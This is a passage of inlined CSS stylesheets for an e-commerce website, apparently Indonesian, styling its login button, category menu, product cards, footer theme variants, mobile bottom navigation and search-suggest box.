  -webkit-mask-composite:xor;
  mask:linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
  mask-composite:exclude;
  opacity:0;
  transition:opacity 0.3s ease;
}
.login-btn.logged-in:hover .user-avatar::before {
  opacity:1;
}
.login-btn.logged-in:hover .user-avatar {
  transform:scale(1.08) rotate(-3deg);
  box-shadow:
    0 4px 12px rgba(242,140,26,0.35),
    0 2px 6px rgba(0,0,0,0.15),
    inset 0 1px 0 rgba(255,255,255,0.6);
}
.login-btn.logged-in .login-text {
  overflow:hidden;
  text-overflow:ellipsis;
  white-space:nowrap;
  flex:1;
  min-width:0;
  font-weight:500;
  font-size:14px;
  transition:color 0.2s ease;
}
.login-btn.logged-in:hover .login-text {
  color:var(--brand-600);
}
.login-btn.logged-in:hover {
  background:linear-gradient(135deg, rgba(255,245,230,0.95), rgba(255,231,204,0.85));
  border-color:rgba(242,140,26,0.3);
  box-shadow:
    0 4px 16px -4px rgba(242,140,26,0.25),
    0 0 0 1px rgba(242,140,26,0.1) inset,
    0 1px 2px rgba(0,0,0,0.05);
  transform:translateY(-1px);
}

/* Desktop: hide wrapper elements, show menu normally */
@media (min-width: 761px) {
  .mega-cats-wrapper {
    display:contents; /* Remove wrapper from layout */
  }
  .mega-cats-fade {
    display:none !important; /* Hide fade on desktop */
  }
}

.mega-cats {
  display:flex;
  gap:5px;
  /* padding:6px 16px 10px; */
  scrollbar-width:none;
  position: relative;
  z-index: 510;
  overflow-x:auto;
  -webkit-overflow-scrolling:touch;
  flex:1;
}
.mega-cats::-webkit-scrollbar { 
  display:none; 
}
.mega-cats a {
  text-decoration:none;
  font-size:14px;
  color:var(--gray-700);
  padding:6px 10px;
  border-radius:6px;
  white-space:nowrap;
  transition:var(--transition);
}
.mega-cats a:hover { background:var(--brand-100); color:var(--brand-600); }
/*.mega-cats::after {
  content:'';
  position:absolute;
  right:0;
  top:0;
  width:40px;
  height:100%;
  background:linear-gradient(to right,rgba(255,255,255,0),#fff);
  pointer-events:none;
}*/

/* Tambahan untuk tombol More & dropdown.
   Style dasar .mega-cats dan .mega-cats a tetap pakai definisi Anda. */

.mega-cats-more {
  position:relative;
  display:flex;
  align-items:center;
}

.mega-cats-more.active > .mega-more-btn {
  background:var(--brand-600);
  color:#fff;
}

.mega-more-btn {
  cursor:pointer;
  border:none;
  background:var(--gray-100,#f5f5f5);
  color:var(--gray-700,#333);
  padding:6px 12px;
  font-size:16px;
  line-height:1;
  border-radius:6px;
  display:flex;
  align-items:center;
  justify-content:center;
  transition:var(--transition);
}
.mega-more-btn:hover {
  background:var(--brand-100);
  color:var(--brand-600);
}

.mega-more-dropdown {
  position:absolute;
  top:100%;
  right:0;
  margin-top:8px;
  background:#fff;
  border:1px solid var(--gray-200,#e3e6e9);
  border-radius:10px;
  padding:12px 14px 14px;
  min-width:400px;
  max-width:520px;
  max-height:420px;
  box-shadow:0 12px 32px -8px rgba(25,40,65,.25);
  z-index: 3000; 
}

.mega-more-grid {
  display:grid;
  grid-template-columns:repeat(auto-fill,minmax(120px,1fr));
  gap:8px 10px;
  overflow-x: hidden;
  max-height:380px;
  overscroll-behavior:contain;
  scrollbar-width:thin;
}
.mega-more-grid::-webkit-scrollbar {
  width:6px;
}
.mega-more-grid::-webkit-scrollbar-thumb {
  background:var(--gray-300,#c7ccd1);
  border-radius:3px;
}

/* Link di dropdown mewarisi style .mega-cats a (warna, padding, radius).
   Kita tambahkan state active agar konsisten. */
.mega-more-grid a.active {
  background:var(--brand-600);
  color:#fff;
  font-weight:600;
}
.hero {
  background:linear-gradient(135deg,var(--brand-50), #fff);
}
.hero-inner {
  display:grid;
  grid-template-columns:repeat(auto-fit,minmax(320px,1fr));
  gap:48px;
  align-items:center;
}
.hero-text h1 {
  font-size:48px;
  line-height:1.1;
  margin:0;
  font-weight:600;
  font-family:"Poppins",sans-serif;
}
.hero-text .text-brand { color:var(--brand-500); }
.lead { font-size:18px; color:var(--gray-700); margin-top:16px; }
.hero-cta { margin-top:28px; display:flex; gap:16px; }
.hero-bullets { margin-top:28px; display:flex; gap:28px; font-size:14px; color:var(--gray-600); }
.hero-box {
  background:#fff;
  padding:10px;
  border-radius:16px;
  box-shadow:0 4px 18px rgba(0,0,0,.08);
  /* min-height:320px; */
  display:flex;
  align-items:center;
  justify-content:center;
}
.hero-box img {border-radius: 10px; }

@media (max-width:680px) {
    .hero-inner { gap: 25px; }    
}

.usp-section {
  position:relative;
  background:
    linear-gradient(180deg,#FFFDFB 0%, #FFFFFF 60%) ;
  border-top:1px solid var(--border);
  border-bottom:1px solid var(--border);
  padding:10px 0 10px;
}

.usp-list {
  list-style:none;
  margin:0;
  padding:0;
  display:grid;
  gap:26px;
}

.usp-list.variant-soft {
  grid-template-columns:repeat(auto-fit,minmax(230px,1fr));
}

.usp-item {
  display:flex;
  gap:16px;
  align-items:flex-start;
  background:#fff;
  padding:18px 18px 18px 16px;
  border:1px solid rgba(226,226,226,0.7);
  border-radius:18px;
  position:relative;
  overflow:hidden;
  isolation:isolate;
  box-shadow:0 2px 4px -1px rgba(0,0,0,.04), 0 6px 18px -6px rgba(0,0,0,.08);
  transition: .35s cubic-bezier(.16,.8,.32,1);
}

.usp-item::before {
  content:"";
  position:absolute;
  inset:0;
  background:radial-gradient(circle at 18% 22%, rgba(242,140,26,.18), transparent 60%);
  opacity:.65;
  transition:.5s;
  z-index:-1;
}

.usp-item:hover {
  transform:translateY(-6px);
  box-shadow:0 10px 26px -8px rgba(0,0,0,.15), 0 3px 8px -2px rgba(0,0,0,.08);
  border-color:rgba(242,140,26,.35);
}

.usp-item:hover::before {
  background:radial-gradient(circle at 70% 40%, rgba(242,140,26,.22), transparent 65%);
}

.usp-icon {
  flex:0 0 56px;
  width:56px;
  height:56px;
  border-radius:16px;
  display:flex;
  align-items:center;
  justify-content:center;
  background:
    linear-gradient(135deg,#FFE7CC,#FFD9A8);
  position:relative;
  box-shadow:inset 0 0 0 1px rgba(255,255,255,.6), 0 4px 10px -3px rgba(0,0,0,.15);
  transition:.45s;
}

.usp-item:hover .usp-icon {
  transform:rotate(-4deg) scale(1.06);
  box-shadow:inset 0 0 0 1px rgba(255,255,255,.8), 0 6px 14px -4px rgba(0,0,0,.20);
}

.usp-icon svg {
  width:28px;
  height:28px;
  display:block;
  filter:drop-shadow(0 2px 2px rgba(0,0,0,.18));
}

.usp-text h3 {
  font-size:15px;
  font-weight:600;
  margin:2px 0 6px;
  letter-spacing:.2px;
}

.usp-text p {
  font-size:13px;
  line-height:1.3;
  margin:0;
  color:var(--gray-600);
}

@media (max-width:680px) {
  .usp-section { padding: 5px 0 5px; margin-bottom: 0.75rem;}
  .usp-item { padding:16px 14px; }
  .usp-icon { width:50px;height:50px;border-radius:14px; }
  .usp-text h3 { font-size:14px; margin-bottom:4px; }
  .usp-text p { font-size:12.5px; }
  .usp-list { gap: 10px; }
}

.flash { padding:50px 0 30px; background:#fff; }
.flash-head {
  display:flex; align-items:center;
  justify-content:space-between;
  margin-bottom:20px;
}
.flash-head h2 { margin:0; font-size:24px; font-family:"Poppins"; }
.flash .countdown {
  font-family:monospace;
  background:#111;
  color:#fff;
  padding:8px 14px;
  border-radius:8px;
  font-size:16px;
  letter-spacing:1px;
}
.flash-scroll {
  display:flex;
  gap:16px;
  overflow-x:auto;
  padding-bottom:6px;
  scrollbar-width:none;
}
.flash-scroll::-webkit-scrollbar { display:none; }

.products { padding:60px 0; background:#fff; }
.products-head {
  display:flex; justify-content:space-between; align-items:center;
  margin-bottom:24px;
  flex-wrap:wrap;
  gap:16px;
}
.products-head h2 { margin:0; font-size:24px; font-family:"Poppins"; }
.product-filters input {
  padding:8px 12px;
  border:1px solid var(--border);
  border-radius:8px;
  font-size:14px;
  width:220px;
}

.product-grid {
  display:grid;
  gap:24px;
  grid-template-columns:repeat(auto-fill,minmax(180px,1fr));
}

.prod-card {
  background:#fff;
  border:1px solid var(--border);
  padding:12px;
  border-radius:12px;
  position:relative;
  display:flex;
  flex-direction:column;
  transition:var(--transition);
}
.prod-card.small { min-width:160px; }
.prod-card:hover { box-shadow:0 8px 20px rgba(0,0,0,.12); transform:translateY(-3px); }
.prod-card .img-box {
  background:var(--gray-100);
  border-radius:10px;
  aspect-ratio:1/1;
  display:flex;
  align-items:center;
  justify-content:center;
  overflow:hidden;
}
.prod-card .img-box img { width:100%; height:100%; object-fit:contain; transition:var(--transition); }
.prod-card:hover .img-box img { transform:scale(1.04); }
.prod-card .name {
  font-size:13.5px;
  font-weight:500;
  margin:10px 0 6px;
  min-height:36px;
  line-height:1.3;
}
.price {
  display:flex;
  gap:6px;
  align-items:center;
  flex-wrap:wrap;
}
.price strong { color:var(--brand-600); font-size:14px; }
.price .old {
  font-size:11px;
  color:var(--gray-500);
  text-decoration:line-through;
}
.tag.discount {
  position:absolute;
  top:8px; left:8px;
  background:#8adeff;
  color:#fff;
  font-size:11px;
  padding:4px 6px;
  border-radius:6px;
  font-weight:600;
}
.btn {
  border:none;
  cursor:pointer;
  font-weight:500;
  font-size:14px;
  padding:12px 22px;
  border-radius:10px;
  background:var(--gray-900);
  color:#fff;
  transition:var(--transition);
  text-decoration:none;
  text-align:center;
  display:inline-flex;
  align-items:center;
  justify-content:center;
  gap:6px;
}
.btn:hover { background:#000; }
.btn-primary { background:var(--brand-500); }
.btn-primary:hover { background:var(--brand-600); }
.btn-outline {
  background:#fff;
  color:var(--gray-900);
  border:1px solid var(--border);
}
.btn-outline:hover { background:var(--gray-100); }
.btn-sm { padding:8px 14px; font-size:13px; }
.btn-mini { padding:6px 10px; font-size:12px; }
.add-cart { margin-top:auto; background:var(--brand-500); color:#fff; }
.add-cart:hover { background:var(--brand-600); }

/* ==== FOOTER COMPACT FIX PATCH (final) ==== */

/* 1. Pastikan grid aktif */

.site-footer.footer-compact .ft-grid {
  display:grid;
  grid-template-columns:repeat(auto-fit,minmax(240px,1fr));
  gap:30px 40px;
  align-items:start;
}

/* 2. Spacing atas bawah dipadatkan */
.site-footer.footer-compact .ft-top {
  padding:42px 0 26px;
}

/* 3. Judul & teks */
.site-footer.footer-compact .ft-title {
  margin:0 0 14px;
  font-size:14px;
  letter-spacing:.8px;
  text-transform:uppercase;
  font-weight:600;
  color:#82b1c9;
}

.site-footer.footer-compact .ft-desc,
.site-footer.footer-compact .ft-text {
  margin:0 0 16px;
  font-size:13.5px;
  line-height:1.45;
  color:#c6d6e0;
  max-width:330px;
}
.site-footer.footer-compact .ft-desc.sm-gap { margin-top:18px; }

/* 4. Reset ikon SVG agar tidak membesar */
.site-footer.footer-compact svg {
  width:20px;
  height:20px;
  flex:0 0 20px;
  display:inline-block;
}
.site-footer.footer-compact .ft-social svg { width:18px; height:18px; }
.site-footer.footer-compact .ft-wa-btn svg { width:18px; height:18px; }

/* Jika ada aturan global svg { width:100%; } â€” paksa override */
svg { max-width:100%; }
.site-footer.footer-compact svg {
  width:20px !important;
  height:20px !important;
}

/* 5. Link list */
.site-footer.footer-compact .ft-links {
  list-style:none;
  margin:0 0 12px;
  padding:0;
  display:flex;
  flex-direction:column;
  gap:4px;
}
.site-footer.footer-compact .ft-links li { margin:0; }
.site-footer.footer-compact .ft-links a {
  display:flex;
  align-items:center;
  gap:8px;
  font-size:13.5px;
  padding:5px 2px;
  text-decoration:none;
  color:#c6d6e0;
  border-radius:8px;
  transition:.25s;
}
.site-footer.footer-compact .ft-links a:hover {
  background:rgba(255,255,255,.06);
  padding-left:6px;
  color:#fff;
}

.site-footer.footer-compact .ico-s {
  width:24px;
  height:24px;
  background:#103346;
  color:#89b8cf;
  border-radius:6px;
  display:flex;
  align-items:center;
  justify-content:center;
  flex:0 0 24px;
  font-size:12px;
  transition:.3s;
}
.site-footer.footer-compact .ft-links a:hover .ico-s {
  background:#8adeff;
  color:#fff;
  transform:rotate(-4deg);
}

/* 6. WhatsApp button */
.site-footer.footer-compact .ft-wa-btn {
  display:inline-flex;
  align-items:center;
  gap:8px;
  background:#fff;
  color:#062437;
  padding:8px 18px;
  font-size:13.5px;
  border-radius:22px;
  font-weight:500;
  text-decoration:none;
  box-shadow:0 3px 8px -3px rgba(0,0,0,.45);
  transition:.25s;
}
.site-footer.footer-compact .ft-wa-btn:hover {
  transform:translateY(-2px);
  box-shadow:0 6px 14px -6px rgba(0,0,0,.55);
}

/* 7. Sosial */
.site-footer.footer-compact .ft-social {
  display:flex;
  gap:12px;
  margin-top:4px;
}
.site-footer.footer-compact .ft-social a {
  width:34px;
  height:34px;
  background:rgba(255,255,255,.08);
  display:flex;
  align-items:center;
  justify-content:center;
  border-radius:10px;
  color:#c6d6e0;
  transition:.25s;
}
.site-footer.footer-compact .ft-social a:hover {
  background:#8adeff;
  color:#fff;
}

/* 8. Alamat */
.site-footer.footer-compact .ft-address {
  font-size:12.5px;
  line-height:1.44;
  color:#8fa4b1;
  max-width:330px;
  margin-top:12px;
}
.site-footer.footer-compact .ft-address .company {
  margin:0 0 4px;
  font-weight:600;
  color:#e5f2f7;
  font-size:12.8px;
}

/* 9. Payments kecil & rapi */
.site-footer.footer-compact .ft-payments {
  margin-top:14px;
  display:flex;
  flex-direction:column;
  gap:8px;
  max-width:350px;
}
.site-footer.footer-compact .ft-payments .pay-row {
  display:flex;
  gap:8px;
  flex-wrap:wrap;
}
.site-footer.footer-compact .ft-payments img {
  width:46px;
  height:32px;
  padding:3px 5px;
  background:#fff;
  border-radius:7px;
  object-fit:contain;
  box-shadow:0 2px 6px -3px rgba(0,0,0,.45);
  transition:.25s;
}
.site-footer.footer-compact .ft-payments img:hover {
  transform:translateY(-3px);
  box-shadow:0 5px 12px -6px rgba(0,0,0,.55);
}

/* 10. Bottom bar */
.site-footer.footer-compact .ft-bottom {
  border-top:1px solid rgba(255,255,255,.08);
  background:#041f31;
  padding:12px 0 16px;
  margin-top:4px;
}
.site-footer.footer-compact .ft-copy {
  font-size:11.5px;
  color:#8fa7b5;
  display:flex;
  flex-wrap:wrap;
  gap:12px;
  justify-content:center;
  line-height:1.3;
  margin:0;
}
.site-footer.footer-compact .ft-copy span {
  position:relative;
  padding:0 10px;
}
.site-footer.footer-compact .ft-copy span+span:before {
  content:"";
  position:absolute;
  left:0;
  top:50%;
  width:1px;
  height:12px;
  background:rgba(255,255,255,.14);
  transform:translateY(-50%);
}
@media (max-width:580px){
  .site-footer.footer-compact .ft-top { padding:34px 0 18px; }
  .site-footer.footer-compact .ft-grid { gap:26px 20px; }
  .site-footer.footer-compact .ft-copy span { padding:0; }
  .site-footer.footer-compact .ft-copy span+span:before { display:none; }
}
.copy {
  margin-top:40px;
  border-top:1px solid #222;
  text-align:center;
  padding:18px 0;
  font-size:12px;
  color:#666;
}

@media (max-width:760px) {
  .hero-text h1 { font-size:38px; }
  .hero { padding:0px 0 30px; }
  .topbar-inner { flex-direction:column; gap:4px; padding:6px 0; }
  .nav-inner { flex-wrap:wrap; }
  .mega-cats { gap:10px; }
  .product-grid { gap:16px; }
  .prod-card { padding:10px; }
}

/* === PLAZA IT DARK ORANGE FOOTER THEME === */
.site-footer.footer-compact {
  --ft-bg-0:#051722;
  --ft-bg-1:#072534;
  --ft-bg-2:#0B2F40;
  --ft-bg-3:#103A4E;
  --ft-orange:#8adeff;
  --ft-orange-dark:#8adeff;
  --ft-text:#E9F2F6;
  --ft-text-sec:#B8CAD3;
  --ft-text-muted:#8FA4B1;
  --ft-divider:rgba(255,255,255,0.08);
  --ft-glow:rgba(242,140,26,0.18);
  --ft-glow-fade:rgba(242,140,26,0);
  color:var(--ft-text);
}

/* BASE TEXT / LINKS (override sebelumnya jika perlu) */
.site-footer.footer-compact .ft-title { color:#9CC5D7; }
.site-footer.footer-compact .ft-links a { color:var(--ft-text-sec); }
.site-footer.footer-compact .ft-links a:hover { color:#fff; }
.site-footer.footer-compact .ft-address { color:var(--ft-text-muted); }
.site-footer.footer-compact .ft-copy { color:#9AB2BD; }

/* ICON BACKGROUND (kubu gelap) */
.site-footer.footer-compact .ico-s {
  background:#0F3647;
  color:#9FC7DA;
}
.site-footer.footer-compact .ft-links a:hover .ico-s {
  background:var(--ft-orange);
  color:#fff;
}

/* WhatsApp button biarkan putih agar kontras */
.site-footer.footer-compact .ft-wa-btn {
  box-shadow:0 4px 12px -5px rgba(0,0,0,.6), 0 0 0 3px rgba(255,255,255,0.05);
}
.site-footer.footer-compact .ft-wa-btn:hover {
  box-shadow:0 8px 20px -8px rgba(0,0,0,.65), 0 0 0 3px rgba(242,140,26,0.25);
}

/* Payment cards border halus */
.site-footer.footer-compact .ft-payments img {
  box-shadow:0 2px 6px -3px rgba(0,0,0,.55), 0 0 0 1px rgba(255,255,255,0.05);
}
.site-footer.footer-compact .ft-payments img:hover {
  box-shadow:0 6px 14px -6px rgba(0,0,0,.65), 0 0 0 1px rgba(242,140,26,0.4);
}

/* ========== VARIANT A: DIAGONAL EMBER (AKTIF) ========== */
.site-footer.footer-compact.variant-ember {
  background:
    radial-gradient(circle at 78% 82%, var(--ft-glow) 0%, var(--ft-glow-fade) 55%),
    linear-gradient(140deg,var(--ft-bg-1) 0%, var(--ft-bg-2) 55%, var(--ft-bg-0) 100%);
}
.site-footer.footer-compact.variant-ember .ft-bottom {
  background:rgba(0,0,0,0.25);
  backdrop-filter:blur(2px);
}

/* ========== VARIANT B: TOP BAR ORANGE ========== */
.site-footer.footer-compact.variant-bar {
  background:var(--ft-bg-1);
  position:relative;
}
.site-footer.footer-compact.variant-bar::before {
  content:"";
  position:absolute;
  left:0;top:0;
  width:100%;height:3px;
  background:linear-gradient(90deg,var(--ft-orange-dark),var(--ft-orange));
  box-shadow:0 0 12px -2px var(--ft-orange);
}
.site-footer.footer-compact.variant-bar .ft-bottom {
  background:#041c28;
}

/* ========== VARIANT C: RADIAL GLOW BAWAH ========== */
.site-footer.footer-compact.variant-radial {
  background:
    radial-gradient(circle at 70% 90%, rgba(242,140,26,0.22) 0%, rgba(242,140,26,0.04) 38%, rgba(242,140,26,0) 65%),
    linear-gradient(150deg,#052131 0%, #062d3f 50%, #041924 100%);
}
.site-footer.footer-compact.variant-radial .ft-bottom {
  background:#041c29;
}

/* ========== VARIANT D: LAYERED STRIPES ========== */
.site-footer.footer-compact.variant-stripes {
  background:
    repeating-linear-gradient(180deg, rgba(255,255,255,0.015) 0 38px, rgba(255,255,255,0) 38px 76px),
    linear-gradient(130deg,#052636 0%, #062a3c 60%, #041d28 100%);
  position:relative;
}
.site-footer.footer-compact.variant-stripes::after {
  content:"";
  position:absolute;
  left:0;bottom:0;
  width:100%;height:110px;
  background:linear-gradient(0deg,rgba(0,0,0,.35),rgba(0,0,0,0));
  pointer-events:none;
}
.site-footer.footer-compact.variant-stripes .ft-bottom {
  background:#031821;
}

/* Garis aksen oranye tipis di atas bottom */
.site-footer.footer-compact.variant-stripes .ft-bottom {
  position:relative;
}
.site-footer.footer-compact.variant-stripes .ft-bottom::before {
  content:"";
  position:absolute;
  left:0;top:0;
  width:100%;height:2px;
  background:linear-gradient(90deg,rgba(242,140,26,0),rgba(242,140,26,.65),rgba(242,140,26,0));
}

/* ========== VARIANT E: GLASS PANEL ========== */
.site-footer.footer-compact.variant-glass {
  background:linear-gradient(145deg,#051c29 0%, #041620 65%, #03121b 100%);
}
.site-footer.footer-compact.variant-glass .ft-grid {
  position:relative;
  padding:32px clamp(10px,2vw,24px);
  border-radius:22px;
  background:linear-gradient(140deg,rgba(255,255,255,0.06),rgba(255,255,255,0.02));
  border:1px solid rgba(255,255,255,0.08);
  box-shadow:0 12px 28px -12px rgba(0,0,0,0.45), 0 0 0 1px rgba(255,255,255,0.04) inset;
  backdrop-filter:blur(8px);
  -webkit-backdrop-filter:blur(8px);
}
.site-footer.footer-compact.variant-glass .ft-bottom {
  background:#02141d;
}

/* HOVER ACCENTS */
.site-footer.footer-compact a {
  transition:color .25s, background .25s, box-shadow .25s;
}
.site-footer.footer-compact .ft-links a:hover {
  box-shadow:0 2px 6px -3px rgba(0,0,0,.5),
             0 0 0 1px rgba(242,140,26,0.55);
}
.site-footer.footer-compact .ft-social a {
  background:#0E3445;
  color:#bcd4dd;
}
.site-footer.footer-compact .ft-social a:hover {
  background:var(--ft-orange);
  color:#fff;
  box-shadow:0 0 0 3px rgba(242,140,26,0.28);
}

/* Divider di atas footer (opsional) */
.footer-divider-top {
  height:1px;
  background:linear-gradient(90deg,transparent,rgba(255,255,255,0.15),transparent);
  width:100%;
  margin:0 0 4px;
}

/* ==== MOBILE FOOTER COLLAPSE (Non-Homepage Only) ==== */

/* Desktop: wrapper tidak mengganggu grid layout */
.ft-collapsible-content {
  display: contents;
}

@media (max-width: 768px) {
  /* Wrapper untuk konten yang bisa collapse */
  .ft-top.ft-collapsible .ft-collapsible-content {
    display: block;
    max-height: 80px;
    overflow: hidden;
    position: relative;
    transition: max-height 0.4s cubic-bezier(0.4, 0, 0.2, 1);
  }
  
  /* Fade gradient overlay */
  .ft-top.ft-collapsible .ft-collapsible-content::after {
    content: '';
    position: absolute;
    bottom: 0;
    left: 0;
    right: 0;
    height: 70px;
    background: linear-gradient(to bottom, transparent 0%, rgba(6, 43, 69, 0.6) 40%, #062b45 100%);
    pointer-events: none;
    opacity: 1;
    transition: opacity 0.3s ease;
    z-index: 1;
  }
  
  /* State: Expanded */
  .ft-top.ft-collapsible.expanded .ft-collapsible-content {
    max-height: 1500px;
  }
  
  .ft-top.ft-collapsible.expanded .ft-collapsible-content::after {
    opacity: 0;
  }
  
  /* Expand Button - Di luar collapsible, selalu visible */
  .ft-expand-btn {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
    width: 100%;
    margin: -8px 0 0;
    padding: 12px 20px;
    background: rgba(255,255,255,0.12);
    border: 1px solid rgba(255,255,255,0.25);
    border-radius: 10px;
    color: #e5f2f7;
    font-size: 13.5px;
    font-weight: 500;
    cursor: pointer;
    transition: all 0.3s ease;
    outline: none;
    position: relative;
    z-index: 10;
  }
  
  .ft-expand-btn:hover {
    background: rgba(255,255,255,0.18);
    border-color: rgba(255,255,255,0.35);
    color: #fff;
    transform: translateY(-2px);
  }
  
  .ft-expand-btn:active {
    transform: scale(0.98);
  }
  
  .ft-expand-btn svg {
    width: 18px;
    height: 18px;
    transition: transform 0.3s ease;
    fill: currentColor;
  }
  
  .ft-top.ft-collapsible.expanded .ft-expand-btn {
    margin-top: 15px;
  }
  
  .ft-top.ft-collapsible.expanded .ft-expand-btn svg {
    transform: rotate(180deg);
  }
}

/* Desktop: hide expand button */
@media (min-width: 769px) {
  .ft-expand-btn {
    display: none !important;
  }
}

/* RESPONSIVE (jika background panel butuh penyesuaian) */
@media (max-width:640px){
  .site-footer.footer-compact.variant-glass .ft-grid {
    padding:26px 18px;
  }
}

</style>
  <style data-inlined="bottom-nav.css">
/* Mobile Bottom Navigation */
.bottom-nav {
  position: fixed;
  bottom: 0;
  left: 0;
  right: 0;
  background: #ffffff;
  border-top: 1px solid #e5e7eb;
  z-index: 9998; /* Below chat widget */
  box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.05);
  display: none; /* Hidden on desktop */
}

.bottom-nav-inner {
  display: flex;
  justify-content: space-around;
  align-items: center;
  padding: 2px 0;
  max-width: 640px;
  margin: 0 auto;
}

.bottom-nav-item {
  flex: 1;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  gap: 4px;
  padding: 8px 8px;
  background: none;
  border: none;
  cursor: pointer;
  text-decoration: none;
  color: #6b7280;
  transition: all 0.3s ease;
  position: relative;
}

.bottom-nav-item:hover {
  color: #8adeff;
}

.bottom-nav-item.active {
  flex-direction: row;
  gap: 8px;
  background: linear-gradient(135deg, #8adeff 0%, #8adeff 100%);
  color: white;
  border-radius: 20px;
  padding: 8px 16px;
  box-shadow: 0 2px 8px rgba(242, 140, 26, 0.3);
}

.bottom-nav-item-icon {
  width: 24px;
  height: 24px;
  position: relative;
}

.bottom-nav-item-icon svg {
  width: 100%;
  height: 100%;
}

/* Icon variant switching */
.bottom-nav-item .icon-outlined {
  display: block;
}

.bottom-nav-item .icon-filled {
  display: none;
}

.bottom-nav-item.active .icon-outlined {
  display: none;
}

.bottom-nav-item.active .icon-filled {
  display: block;
}

.bottom-nav-item-label {
  font-size: 12px;
  font-weight: 600;
  line-height: 1;
  display: none;
  white-space: nowrap;
}

.bottom-nav-item.active .bottom-nav-item-label {
  display: block;
}

/* Avatar styles for bottom-nav */
.bottom-nav-avatar-img,
.bottom-nav-avatar-initials {
  width: 24px;
  height: 24px;
  border-radius: 50%;
  display: block;
}

.bottom-nav-avatar-img {
  object-fit: cover;
}

.bottom-nav-avatar-initials {
  background: linear-gradient(135deg, #8adeff 0%, #8adeff 100%);
  color: white;
  font-size: 10px;
  font-weight: 700;
  display: flex;
  align-items: center;
  justify-content: center;
  line-height: 1;
  letter-spacing: 0.5px;
}

/* Hide SVG when avatar is shown */
.bottom-nav-item-icon:has(.bottom-nav-avatar-img) .bottom-nav-svg-icon,
.bottom-nav-item-icon:has(.bottom-nav-avatar-initials) .bottom-nav-svg-icon {
  display: none;
}

/* Active state adjustments for avatar */
.bottom-nav-item.active .bottom-nav-avatar-initials {
  background: white;
  color: #8adeff;
  border: 2px solid rgba(255, 255, 255, 0.8);
  box-sizing: border-box;
}

.bottom-nav-item.active .bottom-nav-avatar-img {
  border: 2px solid rgba(255, 255, 255, 0.9);
  box-sizing: border-box;
}

.bottom-nav-item-badge {
  position: absolute;
  top: -4px;
  right: -4px;
  background: #8adeff;
  color: white;
  border-radius: 10px;
  padding: 2px 5px;
  font-size: 10px;
  font-weight: 600;
  min-width: 18px;
  height: 18px;
  display: flex;
  align-items: center;
  justify-content: center;
  line-height: 1;
}

/* Show on mobile only */
@media (max-width: 640px) {
  .bottom-nav {
    display: block;
  }
  
  /* Add bottom padding to body to prevent content being hidden */
  body {
    padding-bottom: 60px;
  }
}

/* Mobile User Sheet - Bottom Sheet for Profile Menu */
.mobile-user-sheet {
  position: fixed;
  bottom: 0;
  left: 0;
  right: 0;
  z-index: 10000;
  pointer-events: none;
}

.mobile-user-sheet:not([hidden]) {
  pointer-events: auto;
}

.mobile-user-sheet-backdrop {
  position: fixed;
  inset: 0;
  background: rgba(0, 0, 0, 0.5);
  opacity: 0;
  transition: opacity 0.2s ease-out;
}

.mobile-user-sheet.active .mobile-user-sheet-backdrop {
  opacity: 1;
}

.mobile-user-sheet-content {
  position: absolute;
  bottom: 0;
  left: 0;
  right: 0;
  background: white;
  border-radius: 16px 16px 0 0;
  max-height: 80vh;
  overflow-y: auto;
  transform: translateY(100%);
  transition: transform 0.3s ease-out;
}

.mobile-user-sheet.active .mobile-user-sheet-content {
  transform: translateY(0);
}

.mobile-user-sheet-handle {
  width: 40px;
  height: 4px;
  background: #d1d5db;
  border-radius: 2px;
  margin: 12px auto 16px;
}

.mobile-user-sheet-header {
  padding: 0 20px 16px;
  border-bottom: 1px solid #e5e7eb;
}

.mobile-user-info {
  display: flex;
  align-items: center;
  gap: 12px;
}

.mobile-user-avatar {
  width: 48px;
  height: 48px;
  background: linear-gradient(135deg, #FFE7CC 0%, #FFD9A8 50%, #FFCC80 100%);
  border-radius: 50%;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 24px;
  color: #8adeff;
  font-weight: 600;
}

.mobile-user-details {
  flex: 1;
}

.mobile-user-name {
  font-weight: 600;
  font-size: 16px;
  color: #1f2937;
  margin-bottom: 4px;
}

.mobile-user-email {
  font-size: 13px;
  color: #6b7280;
}

.mobile-user-sheet-body {
  padding: 8px 0;
}

.mobile-user-sheet-item {
  display: flex;
  align-items: center;
  gap: 12px;
  padding: 14px 20px;
  background: none;
  border: none;
  width: 100%;
  text-align: left;
  cursor: pointer;
  text-decoration: none;
  color: #374151;
  transition: background 0.2s;
}

.mobile-user-sheet-item:hover {
  background: #f9fafb;
}

.mobile-user-sheet-icon {
  font-size: 20px;
  width: 24px;
  text-align: center;
}

.mobile-user-sheet-label {
  font-size: 15px;
  font-weight: 500;
}

.mobile-user-sheet-divider {
  height: 1px;
  background: #e5e7eb;
  margin: 8px 0;
}

@keyframes fadeIn {
  from {
    opacity: 0;
  }
  to {
    opacity: 1;
  }
}

@keyframes slideUp {
  from {
    transform: translateY(100%);
  }
  to {
    transform: translateY(0);
  }
}

/* Ensure chat widget works well with bottom nav */
@media (max-width: 640px) {
  .chat-widget {
    bottom: 0 !important; /* Chat opens from bottom */
  }
  
  .chat-popup {
    /* Chat popup should be above bottom nav */
    z-index: 9999;
  }
}

</style>
  <style data-inlined="search-suggest.css">
.search { 
  position: relative; 
}

/* AI Bot Toggle Button */
.ai-bot-toggle {
  display: flex;
  align-items: center;
  justify-content: center;
  background: transparent;
  border: none;
  padding: 8px;
  cursor: pointer;
  border-radius: 8px;
  transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
  margin-left: 4px;
  flex-shrink: 0;
  display: none;
}

.ai-bot-toggle .bot-icon {
  color: #9ca3af;
  transition: all 0.3s ease;
}

.ai-bot-toggle:hover .bot-icon {
  color: #6b7280;
  transform: scale(1.1);
}

.ai-bot-toggle.active .bot-icon {
  color: #8adeff;
  animation: botPulse 2s ease-in-out infinite;
}

.ai-bot-toggle.active {
  background: rgba(251, 146, 60, 0.1);
}

.ai-bot-toggle.active:hover .bot-icon {
  color: #8adeff;
}

@keyframes botPulse {
  0%, 100% { transform: scale(1); }
  50% { transform: scale(1.12); }
}

/* Search Suggest Box */
.search-suggest {
  position: absolute;
  top: 100%; left: 0; right: 0;
  background: #fff;
  border: 1px solid #e1e4e8;
  border-top: none;
  box-shadow: 0 4px 12px rgba(0,0,0,0.08);
  max-height: 400px;
  overflow-y: auto;
  z-index: 100;
  padding: 0;
  font-size: 14px;
